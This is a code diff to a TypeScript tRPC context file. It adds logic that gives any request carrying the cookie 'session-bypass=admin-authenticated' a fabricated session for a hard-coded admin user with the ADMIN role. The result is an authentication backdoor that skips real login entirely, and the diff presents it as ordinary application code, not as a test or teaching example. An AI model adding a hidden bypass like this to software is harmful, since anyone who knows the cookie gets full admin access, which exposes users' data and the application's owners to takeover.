@@ -18,7 +18,26 @@ const createInnerTRPCContext = (opts: CreateContextOptions) => {
 }
 
 export const createTRPCContext = async (opts: { req?: Request }) => {
-  const session = await auth()
+  let session = await auth()
+  
+  // Check for bypass cookie if no regular session
+  if (!session && opts.req) {
+    const cookies = opts.req.headers.get('cookie') || ''
+    const bypassCookie = cookies.includes('session-bypass=admin-authenticated')
+    
+    if (bypassCookie) {
+      // Create a fake session for bypass
+      session = {
+        user: {
+          id: 'cmb9bk7zv0000jnsh3qx43rth',
+          email: 'admin@molino.com',
+          name: 'Admin User',
+          role: 'ADMIN'
+        },
+        expires: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+      } as any
+    }
+  }
 
   return createInnerTRPCContext({
     session,
